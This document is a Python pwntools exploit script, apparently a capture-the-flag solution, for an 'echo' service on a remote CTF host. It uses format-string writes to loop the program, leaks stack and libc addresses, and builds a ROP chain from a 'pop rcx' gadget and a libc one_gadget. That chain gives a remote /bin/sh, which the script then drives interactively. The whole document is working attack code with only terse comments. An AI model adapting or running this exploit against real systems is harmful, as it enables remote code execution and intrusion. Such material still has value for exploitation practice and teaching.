#!/usr/bin/env python2
from pwn import *

import sys, time

file = './echo'
# server, port = '127.0.0.1'  , 10132
server, port = 'csie.ctf.tw', 10132

r, context.binary = remote(server, port), file
# ========================================================================
file, libc = ELF( file ), ELF("libc-2.27.so")

def send_payload(payload):
    r.send(payload)
    sleep(0.5)

# $> one_gadget libc-2.27.so
# Get: 0x04f2c5 execve("/bin/sh", rsp+0x40, environ), constraints: rcx == NULL
libc_one_gadget = 0x04f2c5
# $> ROPgadget --binary libc-2.27.so | grep ': pop rcx ; ret'
# Get: 0x000000000003eb0b : pop rcx ; ret
libc_pop_rcx    = 0x03eb0b

# change 0x601010 to 1, sleep to run loop echo
payload = '%{}c%7$n'.format(0x601010)
send_payload(payload)
payload = '%{}c%9$hhn'.format(0x1)
send_payload(payload)

# leak information
payload = '%7$p|%10$p|'
send_payload(payload)

return_addr = int(r.recvuntil('|')[2:-1], 16) - 8
libc_base   = int(r.recvuntil('|')[2:-1], 16) - libc.symbols["__libc_start_main"] - 231

libc_one_gadget = libc_base + libc_one_gadget
libc_pop_rcx    = libc_base + libc_pop_rcx

# 5$ ==> 7$ ==> return addr
payload = '%{}c%5$hn'.format(return_addr % 65536)
send_payload(payload)

def send_payloads( address, return_addr ):
    for i in range(4):
        write_count = address % 65536
        payload = '%7$hn' if write_count == 0 else '%{}c%7$hn'.format( write_count )
        send_payload(payload)
        address //= 65536

        return_addr += 2
        payload = '%{}c%5$hhn'.format(return_addr % 256)
        send_payload(payload)

    return return_addr

# pop rcx
return_addr = send_payloads(libc_pop_rcx, return_addr)

# write 0
# return_addr = send_payloads(0x0, return_addr)
for i in range(4):
    payload = '%7$hn'
    send_payload(payload)

    return_addr += 2
    payload = '%{}c%5$hhn'.format(return_addr % 256)
    send_payload(payload)

# one_gadget
return_addr = send_payloads(libc_one_gadget, return_addr)

r.send("exit")

r.interactive()
